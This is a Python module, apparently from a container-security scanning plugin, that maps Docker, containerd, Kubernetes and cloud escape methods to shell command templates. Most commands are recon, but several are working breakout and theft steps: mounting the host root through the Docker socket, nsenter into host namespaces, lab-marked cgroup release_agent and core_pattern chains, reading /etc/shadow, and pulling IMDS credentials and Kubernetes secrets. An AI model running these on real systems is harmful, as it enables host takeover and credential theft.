"""Docker Escape databases and constants."""

from __future__ import annotations

import copy
import sys
from typing import Any, Dict, List
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from plugins.docker_escape.proto import (
    EscapeMethod,
    SeverityLevel,
    ContainerRuntime,
    VulnerabilityType,
    CapabilityRisk,
    CloudProvider
)

PLUGIN_VERSION = "1.0.0"

# -----------------------------------------------------------------------------
# Exploitation command templates (kept in database module to avoid hardcoding
# long command blocks in orchestration code).
# -----------------------------------------------------------------------------

DOCKER_ESCAPE_COMMANDS: Dict[str, Dict[str, Any]] = {
    # Socket-Based Escapes
    EscapeMethod.DOCKER_SOCK.value: {
        "commands": [
            "$ ls -la /var/run/docker.sock",
            "$ docker -H unix:///var/run/docker.sock ps",
            "$ docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh",
        ],
        "description": "Escape via mounted Docker socket (host-level access)",
    },
    EscapeMethod.CONTAINERD_SOCK.value: {
        "commands": [
            "$ ls -la /run/containerd/containerd.sock",
            "$ ctr -a /run/containerd/containerd.sock containers list",
            "$ ctr -a /run/containerd/containerd.sock run --rm -t --mount type=bind,src=/,dst=/host,options=rbind alpine:latest sh -c 'chroot /host /bin/sh'",
        ],
        "description": "Escape via containerd socket (host-level access)",
    },
    EscapeMethod.DOCKER_TCP.value: {
        "commands": [
            "$ ss -tunap | grep -E ':(2375|2376)\\b' || true",
            "$ curl -s http://127.0.0.1:2375/version 2>/dev/null || true",
            "$ docker -H tcp://127.0.0.1:2375 ps 2>/dev/null || true",
        ],
        "description": "Docker API exposed over TCP (check 2375/2376)",
    },
    EscapeMethod.CRIO_SOCK.value: {
        "commands": [
            "$ ls -la /var/run/crio/crio.sock /run/crio/crio.sock 2>/dev/null || true",
            "$ crictl --runtime-endpoint unix:///var/run/crio/crio.sock info 2>/dev/null || crictl info 2>/dev/null || true",
            "$ crictl --runtime-endpoint unix:///var/run/crio/crio.sock pods 2>/dev/null | head -n 20 || true",
        ],
        "description": "CRI-O socket: crictl/run with host mounts can yield host root (same class as docker.sock)",
    },
    EscapeMethod.PODMAN_SOCK.value: {
        "commands": [
            "$ ls -la /run/podman/podman.sock /var/run/podman/podman.sock 2>/dev/null || true",
            "$ podman --url unix:///run/podman/podman.sock ps 2>/dev/null || podman ps 2>/dev/null || true",
            "$ podman --url unix:///run/podman/podman.sock run --rm -v /:/host:rslave -it alpine chroot /host /bin/sh 2>/dev/null || true",
        ],
        "description": "Podman socket: API access can start privileged containers with host filesystem bind",
    },

    # Privileged / Host Sharing
    EscapeMethod.PRIVILEGED_CONTAINER.value: {
        "commands": [
            "$ cat /proc/self/status | grep CapEff",
            "$ nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
            "$ mount /dev/sda1 /mnt && chroot /mnt",
        ],
        "description": "Privileged container escape via nsenter/mount",
    },
    EscapeMethod.HOST_PID.value: {
        "commands": [
            "$ ps aux | head -n 50",
            "$ cat /proc/1/root/etc/shadow 2>/dev/null || true",
            "$ nsenter --target 1 --mount -- /bin/sh",
        ],
        "description": "Host PID namespace access (inspect host processes/files)",
    },
    EscapeMethod.HOST_NETWORK.value: {
        "commands": [
            "$ ss -tlnp | head -n 50",
            "$ iptables -L -n 2>/dev/null || true",
            "$ tcpdump -i any -c 50 2>/dev/null || true",
        ],
        "description": "Host network namespace access (sniff/iptables/ports)",
    },
    EscapeMethod.NSENTER.value: {
        "commands": [
            "$ capsh --print 2>/dev/null | grep -i sys_admin || true",
            "$ command -v nsenter >/dev/null && nsenter --target 1 --mount --uts --ipc --net --pid -- id 2>/dev/null || true",
            "$ nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh -c 'id; hostname; cat /etc/hostname 2>/dev/null' 2>/dev/null || true",
        ],
        "description": "Join host namespaces via nsenter (effective with CAP_SYS_ADMIN / privileged)",
    },
    EscapeMethod.DEVICE_ACCESS.value: {
        "commands": [
            "$ ls -la /dev/sda /dev/sda1 /dev/nvme0n1 /dev/mem /dev/kmem /dev/port 2>/dev/null || true",
            "$ for d in /dev/sda /dev/mem; do [ -r \"$d\" ] 2>/dev/null && echo \"readable:$d\"; done",
            "# Host block/raw memory devices inside the container are full compromise primitives.",
        ],
        "description": "Dangerous host devices visible inside container (disk, /dev/mem, etc.)",
    },

    # Capabilities
    EscapeMethod.CAP_SYS_ADMIN.value: {
        "commands": [
            "$ capsh --print | grep -i sys_admin || true",
            "$ mount | head -n 50",
            "$ mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || true",
            "# --- LAB / disposable VM: cgroup v1 release_agent (needs mount above; omit if rdma controller unavailable) ---",
            "$ mkdir -p /tmp/cgrp/sub && printf '%s\\n' '#!/bin/sh' 'echo mf_lab_ra >> /tmp/mf_lab_cgrp_proof.txt' 'exit 0' > /tmp/cgrp/mf_lab_release.sh && chmod +x /tmp/cgrp/mf_lab_release.sh",
            "$ printf '%s\\n' '/tmp/cgrp/mf_lab_release.sh' > /tmp/cgrp/release_agent 2>/dev/null || true",
            "$ echo 1 > /tmp/cgrp/sub/notify_on_release 2>/dev/null || true",
            "$ sh -c \"echo $$ > /tmp/cgrp/sub/cgroup.procs\"",
            "$ cat /tmp/mf_lab_cgrp_proof.txt 2>/dev/null || echo 'no proof (mount failed or v2-only host)'",
            "$ umount /tmp/cgrp 2>/dev/null || true",
        ],
        "description": "High-risk CAP_SYS_ADMIN (cgroup/mount based escapes)",
    },
    EscapeMethod.CAP_SYS_PTRACE.value: {
        "commands": [
            "$ capsh --print | grep -i sys_ptrace || true",
            "$ ps -eo pid,comm | head -n 50",
            "$ strace -p 1 -o /tmp/host_proc.log 2>/dev/null || true",
        ],
        "description": "High-risk CAP_SYS_PTRACE (attach/inject into host processes)",
    },
    EscapeMethod.CAP_NET_ADMIN.value: {
        "commands": [
            "$ capsh --print | grep -i net_admin || true",
            "$ ip a && ip route",
            "$ iptables -S 2>/dev/null || true",
        ],
        "description": "Network manipulation via CAP_NET_ADMIN",
    },
    EscapeMethod.CAP_SYS_MODULE.value: {
        "commands": [
            "$ capsh --print 2>/dev/null | grep -i sys_module || true",
            "$ lsmod 2>/dev/null | head -n 20 || true",
            "# CAP_SYS_MODULE: unsigned/hostile kernel modules are a ring-0 primitive — verify cap drop and module signing policy.",
        ],
        "description": "CAP_SYS_MODULE: kernel module load (direct host kernel compromise)",
    },
    EscapeMethod.CAP_MKNOD.value: {
        "commands": [
            "$ capsh --print 2>/dev/null | grep -i mknod || true",
            "$ ls -l /dev/null /dev/zero 2>/dev/null || true",
            "# CAP_MKNOD: create block/char nodes for host disks (major/minor) unless device cgroup blocks.",
        ],
        "description": "CAP_MKNOD: create device nodes (path to disk/mem access)",
    },
    EscapeMethod.CAP_DAC_OVERRIDE.value: {
        "commands": [
            "$ capsh --print 2>/dev/null | grep -i dac_override || true",
            "$ test -r /etc/shadow 2>/dev/null && echo readable:/etc/shadow || echo shadow:not_readable_or_missing",
            "# DAC_OVERRIDE bypasses permission bits on files — paired with mounts/secrets it is data exfil.",
        ],
        "description": "CAP_DAC_OVERRIDE: read/write any file regardless of mode bits",
    },
    EscapeMethod.CAP_BPF.value: {
        "commands": [
            "$ capsh --print 2>/dev/null | grep -i bpf || true",
            "$ bpftool prog list 2>/dev/null | head -n 15 || true",
            "# CAP_BPF: load eBPF programs; with weak hardening can become kernel read/write primitives.",
        ],
        "description": "CAP_BPF / eBPF loading surface",
    },

    # Filesystem
    EscapeMethod.HOST_MOUNT.value: {
        "commands": [
            "$ mount | grep -E '(/host|/rootfs| / )' | head -n 50",
            "$ ls -la /host 2>/dev/null || true",
            "$ cat /host/etc/shadow 2>/dev/null || true",
        ],
        "description": "Host filesystem is mounted inside container",
    },
    # /proc/1/root visibility = host init mount namespace leaked into container (breakout primitive), not chroot(2) "exploit" steps
    EscapeMethod.PROC_ROOT_CHROOT.value: {
        "commands": [
            "$ ls -la /proc/1/root 2>/dev/null || true",
            "$ readlink -f /proc/1/root 2>/dev/null || true",
            "$ test -r /proc/1/root/etc/passwd && head -n 3 /proc/1/root/etc/passwd 2>/dev/null || true",
            "# If readable: PID 1's root is the host (or another breakout); confirm runtime/namespace config — a shell may require extra caps (e.g. chroot), use only in authorized IR/lab.",
        ],
        "description": "Verify host filesystem exposure via /proc/1/root (mount-namespace leak), not generic cgroup/cap enumeration",
    },
    EscapeMethod.SENSITIVE_FILES.value: {
        "commands": [
            "$ ls -la /etc 2>/dev/null | head -n 50",
            "$ cat /etc/shadow 2>/dev/null || true",
            "$ find / -maxdepth 3 -name '*.key' -o -name '*.pem' 2>/dev/null | head -n 20 || true",
        ],
        "description": "Sensitive files accessible from container",
    },

    # Kernel sysctl / proc interfaces (Felix Wilhelm–style container breaks when writable)
    EscapeMethod.CORE_PATTERN.value: {
        "commands": [
            "$ cat /proc/sys/kernel/core_pattern 2>/dev/null || true",
            "$ test -w /proc/sys/kernel/core_pattern 2>/dev/null && echo writable:core_pattern || echo not_writable",
            "# --- Read-only recon above; full chain below is LAB / disposable VM ONLY (mutates sysctl, triggers crash) ---",
            "$ ORIG=$(cat /proc/sys/kernel/core_pattern 2>/dev/null); echo \"saved core_pattern length: ${#ORIG}\"",
            "$ printf '%s\\n' '#!/bin/sh' 'echo mf_lab_core_pattern_ran >> /tmp/mf_lab_core_pattern_proof.txt' > /tmp/mf_lab_core_handler.sh && chmod +x /tmp/mf_lab_core_handler.sh",
            "$ printf '%s\\n' '|/tmp/mf_lab_core_handler.sh' > /proc/sys/kernel/core_pattern",
            "$ ulimit -c unlimited 2>/dev/null || true",
            "$ sh -c 'kill -SEGV $$' 2>/dev/null || true",
            "$ cat /tmp/mf_lab_core_pattern_proof.txt 2>/dev/null || echo 'no proof file (coredumps disabled or handler not invoked)'",
            "$ printf '%s' \"$ORIG\" > /proc/sys/kernel/core_pattern 2>/dev/null || echo 'restore failed — fix sysctl from host or reboot lab'",
        ],
        "description": "Writable /proc/sys/kernel/core_pattern (command execution on crash)",
    },
    EscapeMethod.MODPROBE_PATH.value: {
        "commands": [
            "$ cat /proc/sys/kernel/modprobe 2>/dev/null || true",
            "$ test -w /proc/sys/kernel/modprobe 2>/dev/null && echo writable:modprobe || echo not_writable",
            "# Writable modprobe path: load fails invoke attacker path as root — classic container primitive with CAP_SYS_ADMIN context.",
            "# --- Read-only recon above; full chain below is LAB / disposable VM ONLY (mutates sysctl, runs helper as root on module load) ---",
            "$ ORIG_MOD=$(cat /proc/sys/kernel/modprobe 2>/dev/null); echo \"saved modprobe path: ${ORIG_MOD:-<empty>}\"",
            "$ printf '%s\\n' '#!/bin/sh' 'echo mf_lab_modprobe_ran >> /tmp/mf_lab_modprobe_proof.txt' 'exit 0' > /tmp/mf_lab_fake_modprobe.sh && chmod +x /tmp/mf_lab_fake_modprobe.sh",
            "$ printf '%s\\n' '/tmp/mf_lab_fake_modprobe.sh' > /proc/sys/kernel/modprobe",
            "$ command -v modprobe >/dev/null && modprobe mf_lab_nonexistent_$$ 2>/dev/null || true",
            "$ cat /tmp/mf_lab_modprobe_proof.txt 2>/dev/null || echo 'no proof (helper not invoked or modprobe missing)'",
            "$ printf '%s' \"$ORIG_MOD\" > /proc/sys/kernel/modprobe 2>/dev/null || echo 'restore failed — reset from host or reboot lab'",
        ],
        "description": "Writable /proc/sys/kernel/modprobe",
    },
    EscapeMethod.UEVENT_HELPER.value: {
        "commands": [
            "$ cat /sys/kernel/uevent_helper 2>/dev/null || cat /proc/sys/kernel/hotplug 2>/dev/null || true",
            "$ test -w /sys/kernel/uevent_helper 2>/dev/null && echo writable:uevent_helper || true",
            "# Writable uevent_helper runs on hotplug events — historical container escape ingredient.",
            "# --- Read-only recon above; full chain below is LAB / disposable VM ONLY (mutates kernel helper path) ---",
            "$ ORIG_UE=$(cat /sys/kernel/uevent_helper 2>/dev/null); ORIG_HP=$(cat /proc/sys/kernel/hotplug 2>/dev/null); echo \"saved uevent_helper=${ORIG_UE:-} hotplug=${ORIG_HP:-}\"",
            "$ printf '%s\\n' '#!/bin/sh' 'echo mf_lab_uevent_ran >> /tmp/mf_lab_uevent_proof.txt' 'exit 0' > /tmp/mf_lab_fake_uevent.sh && chmod +x /tmp/mf_lab_fake_uevent.sh",
            "$ printf '%s\\n' '/tmp/mf_lab_fake_uevent.sh' > /sys/kernel/uevent_helper 2>/dev/null || printf '%s\\n' '/tmp/mf_lab_fake_uevent.sh' > /proc/sys/kernel/hotplug 2>/dev/null || true",
            "$ echo add > /sys/class/net/lo/uevent 2>/dev/null || command -v udevadm >/dev/null && udevadm trigger --subsystem-match=net --action=add 2>/dev/null || true",
            "$ cat /tmp/mf_lab_uevent_proof.txt 2>/dev/null || echo 'no proof (no uevent reached helper — full VM may be required)'",
            "$ printf '%s' \"$ORIG_UE\" > /sys/kernel/uevent_helper 2>/dev/null; printf '%s' \"$ORIG_HP\" > /proc/sys/kernel/hotplug 2>/dev/null || echo 'restore failed — fix from host'",
        ],
        "description": "Writable /sys/kernel/uevent_helper (or hotplug path)",
    },
    EscapeMethod.PROC_KCORE.value: {
        "commands": [
            "$ ls -la /proc/kcore 2>/dev/null || true",
            "$ readlink -f /proc/kcore 2>/dev/null || true",
            "$ test -r /proc/kcore 2>/dev/null && echo readable:kcore || echo not_readable",
            "$ stat -c 'size=%s' /proc/kcore 2>/dev/null || true",
            "# Readable /proc/kcore maps physical RAM — memory forensics / credential extraction primitive.",
            "# LAB-only (authorized forensics, disposable VM): minimal read — may be blocked or sensitive; do not exfil full image.",
            "$ command -v timeout >/dev/null && timeout 2 dd if=/proc/kcore of=/dev/null bs=65536 count=1 2>&1 | tail -n 1 || echo 'dd blocked or timeout missing'",
        ],
        "description": "Readable /proc/kcore (physical memory exposure)",
    },

    # Cgroups
    EscapeMethod.CGROUP_RELEASE_AGENT.value: {
        "commands": [
            "$ mount | grep cgroup | head -n 50",
            "$ stat -fc %T /sys/fs/cgroup 2>/dev/null || true",
            "$ ls -la /sys/fs/cgroup 2>/dev/null | head -n 50 || true",
            "$ cat /proc/self/cgroup 2>/dev/null || true",
            "# cgroup v2 unified hierarchy has no classic v1 release_agent file — use cgroup v1 mount below for LAB.",
            "# --- LAB / disposable VM ONLY: cgroup v1 release_agent (mutates cgroup fs, may run script as root on cgroup empty) ---",
            "$ mkdir -p /tmp/mf_cgrp_lab && ( mount -t cgroup -o memory cgroup /tmp/mf_cgrp_lab 2>/dev/null || mount -t cgroup -o rdma cgroup /tmp/mf_cgrp_lab 2>/dev/null ) || echo 'v1 cgroup mount failed — try host with v1 controllers'",
            "$ mkdir -p /tmp/mf_cgrp_lab/sub",
            "$ printf '%s\\n' '#!/bin/sh' 'echo mf_lab_release_agent_ran >> /tmp/mf_lab_cgrp_proof.txt' 'exit 0' > /tmp/mf_cgrp_lab/mf_lab_release.sh && chmod +x /tmp/mf_cgrp_lab/mf_lab_release.sh",
            "$ printf '%s\\n' '/tmp/mf_cgrp_lab/mf_lab_release.sh' > /tmp/mf_cgrp_lab/release_agent",
            "$ echo 1 > /tmp/mf_cgrp_lab/sub/notify_on_release",
            "$ sh -c \"echo $$ > /tmp/mf_cgrp_lab/sub/cgroup.procs\"",
            "$ cat /tmp/mf_lab_cgrp_proof.txt 2>/dev/null || echo 'no proof (notify did not fire or mount unusable)'",
            "$ umount /tmp/mf_cgrp_lab 2>/dev/null || true; rm -rf /tmp/mf_cgrp_lab /tmp/mf_lab_cgrp_proof.txt 2>/dev/null || true",
        ],
        "description": "Potential cgroup release_agent escape (depends on kernel/cgroup setup)",
    },

    # Runtime security posture (these must NOT show unrelated docker_sock commands)
    EscapeMethod.SECCOMP_DISABLED.value: {
        "commands": [
            "$ grep -E '^Seccomp:' /proc/self/status || true",
            "$ test -f /proc/self/attr/seccomp && cat /proc/self/attr/seccomp || true",
            "$ grep -i seccomp /proc/self/mountinfo 2>/dev/null | head -n 5 || true",
            "$ cat /proc/self/attr/exec 2>/dev/null || true",
            "# If seccomp is disabled/unconfined: container can use a wider syscall surface (review runtime config).",
        ],
        "description": "Seccomp disabled/unconfined (larger syscall attack surface)",
    },
    EscapeMethod.APPARMOR_DISABLED.value: {
        "commands": [
            "$ test -f /proc/self/attr/current && cat /proc/self/attr/current || true",
            "$ test -d /sys/module/apparmor && cat /sys/module/apparmor/parameters/enabled 2>/dev/null || true",
            "$ command -v aa-status >/dev/null && aa-status 2>/dev/null | head -n 20 || true",
            "$ grep -i apparmor /proc/self/attr/exec 2>/dev/null || true",
            "# If AppArmor is unconfined/disabled: review container profile assignment.",
        ],
        "description": "AppArmor disabled/unconfined (weaker confinement)",
    },
    EscapeMethod.SELINUX_DISABLED.value: {
        "commands": [
            "$ which getenforce 2>/dev/null && getenforce || true",
            "$ test -f /proc/self/attr/current && cat /proc/self/attr/current || true",
            "$ command -v sestatus >/dev/null && sestatus 2>/dev/null | head -n 15 || true",
            "$ cat /proc/self/attr/exec 2>/dev/null | head -c 200 || true",
            "# If SELinux is disabled/permissive: review host policy and container labels.",
        ],
        "description": "SELinux disabled/permissive (weaker MAC enforcement)",
    },
    EscapeMethod.NO_NEW_PRIVS_DISABLED.value: {
        "commands": [
            "$ grep -i NoNewPrivs /proc/self/status 2>/dev/null || true",
            "$ cat /proc/self/attr/exec 2>/dev/null || true",
            "$ grep -E 'no-new-privileges|no_new_privileges' /proc/self/mountinfo 2>/dev/null | head -n 5 || true",
            "# Without no-new-privileges, setuid binaries and file caps inside the image can still elevate.",
        ],
        "description": "no_new_privileges not set (setuid/file-cap transitions still possible)",
    },
    EscapeMethod.READ_ONLY_ROOTFS_DISABLED.value: {
        "commands": [
            "$ mount | grep -E ' on / |overlay' | head -n 5",
            "$ touch /tmp/.mf_rw_probe 2>&1; rm -f /tmp/.mf_rw_probe; echo probe_done",
            "# Writable container root: malware persistence and binary tampering on upper layer.",
        ],
        "description": "Writable container root filesystem (not read-only)",
    },
    EscapeMethod.SYSCALL_ABUSE.value: {
        "commands": [
            "$ grep -E '^Seccomp:|^CapEff:' /proc/self/status || true",
            "$ test -f /proc/self/attr/seccomp && wc -c /proc/self/attr/seccomp 2>/dev/null || true",
            "$ uname -r; zcat /proc/config.gz 2>/dev/null | grep -iE 'bpf|kprobes|ftrace' | head -n 8 || true",
            "# Unusual syscall exposure (e.g. seccomp=unconfined): widens kernel/file attack surface.",
        ],
        "description": "Broad syscall / seccomp posture (mapped from abnormal policy signal)",
    },
    EscapeMethod.ALTERNATIVE_RUNTIME.value: {
        "commands": [
            "$ ps aux 2>/dev/null | grep -E 'qemu|containerd-shim|kata|runsc|gvisor' | head -n 8 || true",
            "$ ls -la /dev/kvm 2>/dev/null || true",
            "$ cat /proc/self/cgroup 2>/dev/null | head -n 8 || true",
            "$ command -v runsc >/dev/null && runsc --version 2>&1 | head -n 3 || true",
            "$ ls -la /proc/self/ns 2>/dev/null | head -n 15 || true",
            "# Kata/Firecracker/gVisor/etc. have distinct breakout surfaces — match guidance to detected runtime.",
        ],
        "description": "Alternative runtime (Kata, gVisor, …) — runtime-specific breakout paths",
    },
    EscapeMethod.NAMESPACE_ESCAPE.value: {
        "commands": [
            "$ readlink /proc/self/ns/mnt /proc/self/ns/pid /proc/self/ns/net 2>/dev/null",
            "$ command -v lsns >/dev/null && lsns 2>/dev/null | head -n 20 || true",
            "$ grep -E 'NStgid|NSpid' /proc/self/status 2>/dev/null || true",
            "$ readlink /proc/1/ns/mnt /proc/self/ns/mnt 2>/dev/null; [ \"$(readlink /proc/1/ns/mnt 2>/dev/null)\" = \"$(readlink /proc/self/ns/mnt 2>/dev/null)\" ] && echo mnt_ns:may_match_host_init || echo mnt_ns:different",
            "$ test -r /proc/1/root/etc/hostname && cat /proc/1/root/etc/hostname 2>/dev/null | head -n 1 || true",
        ],
        "description": "Shared or leaky Linux namespaces (host PID/net/mnt overlap)",
    },

    # Cloud / orchestration
    EscapeMethod.IMDS_ACCESS.value: {
        "commands": [
            "$ curl -s -m 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -n 5 || true",
            "$ curl -s -m 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -n 3 || true",
        ],
        "description": "Link-local metadata service reachable (credential / instance metadata theft)",
    },
    EscapeMethod.AWS_IMDS.value: {
        "commands": [
            "$ curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true",
            "$ curl -s -m 2 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null || true",
            "# Prefer IMDSv2 + hop limit 1; block 169.254.169.254 from pods where possible.",
        ],
        "description": "AWS IMDS: IAM role credentials via metadata API",
    },
    EscapeMethod.GCP_METADATA.value: {
        "commands": [
            "$ curl -s -m 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>/dev/null | head -c 120 || true",
            "$ curl -s -m 2 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id 2>/dev/null || true",
        ],
        "description": "GCP metadata server: access token and project metadata",
    },
    EscapeMethod.AZURE_IMDS.value: {
        "commands": [
            "$ curl -s -m 2 -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null | head -c 300 || true",
        ],
        "description": "Azure Instance Metadata Service (managed identity / instance JSON)",
    },
    EscapeMethod.K8S_SERVICE_ACCOUNT.value: {
        "commands": [
            "$ ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || true",
            "$ test -r /var/run/secrets/kubernetes.io/serviceaccount/token && wc -c /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null",
            "$ curl -s -k --max-time 3 -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\" \"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces\" 2>/dev/null | head -c 400 || true",
        ],
        "description": "Mounted Kubernetes service account token (API auth as that SA)",
    },
    EscapeMethod.K8S_API_ACCESS.value: {
        "commands": [
            "$ curl -s -k --max-time 3 -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\" \"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/apis\" 2>/dev/null | head -c 400 || true",
            "$ curl -s -k --max-time 3 -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\" \"https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/secrets\" 2>/dev/null | head -c 200 || true",
        ],
        "description": "Kubernetes API reachable with pod token — enumerate RBAC, secrets, workloads",
    },

    # Network-layer primitives inside container net ns
    EscapeMethod.ARP_SPOOFING.value: {
        "commands": [
            "$ capsh --print 2>/dev/null | grep -iE 'net_raw|net_admin' || true",
            "$ command -v arping >/dev/null && arping -h 2>&1 | head -n 2 || true",
            "# CAP_NET_RAW: craft ARP/Ethernet frames for MITM on L2 — lab / authorized segment tests only.",
        ],
        "description": "ARP / L2 MITM primitive (CAP_NET_RAW or equivalent)",
    },
    EscapeMethod.IPTABLES_ACCESS.value: {
        "commands": [
            "$ iptables -S 2>/dev/null | head -n 40 || true",
            "$ iptables -t nat -S 2>/dev/null | head -n 30 || true",
            "# Mutable netfilter rules: redirect, bypass policy, intercept cluster traffic.",
        ],
        "description": "iptables/nftables effective control from container (CAP_NET_ADMIN)",
    },
    EscapeMethod.TIOCSTI_INJECTION.value: {
        "commands": [
            "$ grep -E '^Seccomp:' /proc/self/status || true",
            "$ tty 2>/dev/null || true",
            "$ ls -la /dev/tty /dev/pts 2>/dev/null | head -n 10 || true",
            "$ command -v capsh >/dev/null && capsh --print 2>/dev/null | grep -i sys_tty_config || true",
            "# TIOCSTI ioctl injects keystrokes into other TTYs if not blocked by seccomp — classic shared-tty break.",
        ],
        "description": "TIOCSTI TTY keystroke injection (when seccomp allows)",
    },

    # CVEs
    EscapeMethod.CVE_2022_0847.value: {
        "commands": [
            "$ uname -r",
            "$ cat /etc/os-release 2>/dev/null | head -n 8 || true",
            "$ zcat /proc/config.gz 2>/dev/null | grep -iE 'pipe|pipe_inode' | head -n 5 || true",
            "# Dirty Pipe: compare kernel to vendor fix table (5.10.102+, 5.15.25+, 5.16.11+, etc.).",
        ],
        "description": "Dirty Pipe (CVE-2022-0847) check",
    },
    EscapeMethod.CVE_2019_5736.value: {
        "commands": [
            "$ cat /proc/self/exe 2>/dev/null || true",
            "$ command -v runc >/dev/null && runc --version 2>&1 | head -n 5 || true",
            "$ command -v containerd >/dev/null && containerd --version 2>&1 | head -n 3 || true",
            "$ command -v crictl >/dev/null && crictl version 2>&1 | head -n 20 || true",
            "$ command -v docker-runc >/dev/null && docker-runc --version 2>&1 | head -n 3 || true",
            "# runc escape: compare runc/containerd versions to vendor CVE-2019-5736 fix table.",
        ],
        "description": "runc escape (CVE-2019-5736) check",
    },
    EscapeMethod.CVE_2024_21626.value: {
        "commands": [
            "$ ls -la /proc/self/fd/ 2>/dev/null || true",
            "$ command -v runc >/dev/null && runc --version 2>&1 | head -n 5 || true",
            "$ command -v containerd >/dev/null && containerd --version 2>&1 | head -n 3 || true",
            "$ command -v crictl >/dev/null && crictl version 2>&1 | head -n 20 || true",
            "# runc fd leak: compare runc/runtime versions to CVE-2024-21626 fix table.",
        ],
        "description": "runc file descriptor leak (CVE-2024-21626) check",
    },

    # Fallback only: add EscapeMethod.<name>.value above if the scanner emits a new method string
    "default": {
        "commands": [
            "$ id; cat /proc/self/cgroup 2>/dev/null | head -n 8",
            "$ capsh --print 2>/dev/null || true",
            "$ readlink /proc/self/ns/mnt; ls -la /proc/1/root 2>/dev/null | head -n 5",
            "# No dedicated template for this method value — use finding text/MITRE; extend DOCKER_ESCAPE_COMMANDS in escape_databases.py.",
        ],
        "description": "Generic breakout triage (until this method key is mapped explicitly)",
    },
}


def _apply_docker_escape_enum_coverage() -> None:
    """
    Ensure every EscapeMethod enum value maps to a concrete template so OutputService
    never silently uses unrelated generic lines for a named vector.
    """
    ref = DOCKER_ESCAPE_COMMANDS
    ref[EscapeMethod.KUBELET_API.value] = {
        "commands": [
            "$ curl -k -s --max-time 3 https://127.0.0.1:10250/pods 2>/dev/null | head -c 600",
            "$ curl -k -s --max-time 3 https://127.0.0.1:10250/metrics 2>/dev/null | head -n 15",
            "# Weak/anonymous kubelet: exec/run against pod sandboxes — lock down authz and firewall 10250.",
        ],
        "description": "Kubelet API (10250): pod listing/metrics; RCE class when exec API is exposed",
    }
    cve_base: Dict[str, str] = {
        "cve_2022_0492": EscapeMethod.CGROUP_RELEASE_AGENT.value,
        "cve_2020_15257": EscapeMethod.CONTAINERD_SOCK.value,
        "cve_2019_14271": EscapeMethod.DOCKER_SOCK.value,
        "cve_2021_41091": EscapeMethod.SENSITIVE_FILES.value,
        "cve_2022_23648": EscapeMethod.CONTAINERD_SOCK.value,
        "cve_2023_25809": EscapeMethod.CVE_2019_5736.value,
        "cve_2023_27561": EscapeMethod.CVE_2019_5736.value,
        "cve_2023_28642": EscapeMethod.CVE_2019_5736.value,
        "cve_2022_0185": EscapeMethod.CAP_SYS_ADMIN.value,
        "cve_2019_16884": EscapeMethod.APPARMOR_DISABLED.value,
        "cve_2021_30465": EscapeMethod.HOST_MOUNT.value,
        "cve_2016_5195": EscapeMethod.CVE_2022_0847.value,
    }
    alias_src: Dict[str, str] = {
        EscapeMethod.PROC_SELF_MOUNTS.value: EscapeMethod.HOST_MOUNT.value,
        EscapeMethod.DOCKER_FILESYSTEM.value: EscapeMethod.SENSITIVE_FILES.value,
        EscapeMethod.OVERLAYFS_ESCAPE.value: EscapeMethod.HOST_MOUNT.value,
        EscapeMethod.DEBUGFS_MOUNT.value: EscapeMethod.CAP_SYS_ADMIN.value,
        EscapeMethod.SYSFS_WRITE.value: EscapeMethod.CAP_SYS_ADMIN.value,
        EscapeMethod.PROCFS_WRITE.value: EscapeMethod.CORE_PATTERN.value,
        EscapeMethod.SYMLINK_RACE.value: EscapeMethod.HOST_MOUNT.value,
        EscapeMethod.CAP_SYS_RAWIO.value: EscapeMethod.DEVICE_ACCESS.value,
        EscapeMethod.CAP_SYS_CHROOT.value: EscapeMethod.PROC_ROOT_CHROOT.value,
        EscapeMethod.CAP_SYS_BOOT.value: EscapeMethod.CAP_SYS_ADMIN.value,
        EscapeMethod.CAP_NET_RAW.value: EscapeMethod.ARP_SPOOFING.value,
        EscapeMethod.CAP_DAC_READ_SEARCH.value: EscapeMethod.CAP_DAC_OVERRIDE.value,
        EscapeMethod.CAP_SETUID.value: EscapeMethod.CAP_DAC_OVERRIDE.value,
        EscapeMethod.CAP_SETGID.value: EscapeMethod.CAP_DAC_OVERRIDE.value,
        EscapeMethod.CAP_SETFCAP.value: EscapeMethod.CAP_SYS_ADMIN.value,
        EscapeMethod.CAP_FOWNER.value: EscapeMethod.CAP_DAC_OVERRIDE.value,
        EscapeMethod.CAP_AUDIT_WRITE.value: EscapeMethod.CAP_SYS_ADMIN.value,
        EscapeMethod.CAP_PERFMON.value: EscapeMethod.CAP_BPF.value,
        EscapeMethod.CAP_SYS_RESOURCE.value: EscapeMethod.CAP_SYS_ADMIN.value,
        EscapeMethod.PIVOT_ROOT.value: EscapeMethod.PROC_ROOT_CHROOT.value,
        EscapeMethod.UNSHARE.value: EscapeMethod.NAMESPACE_ESCAPE.value,
        EscapeMethod.SETNS.value: EscapeMethod.NAMESPACE_ESCAPE.value,
        EscapeMethod.USER_NAMESPACE.value: EscapeMethod.NAMESPACE_ESCAPE.value,
        EscapeMethod.HOST_IPC.value: EscapeMethod.NAMESPACE_ESCAPE.value,
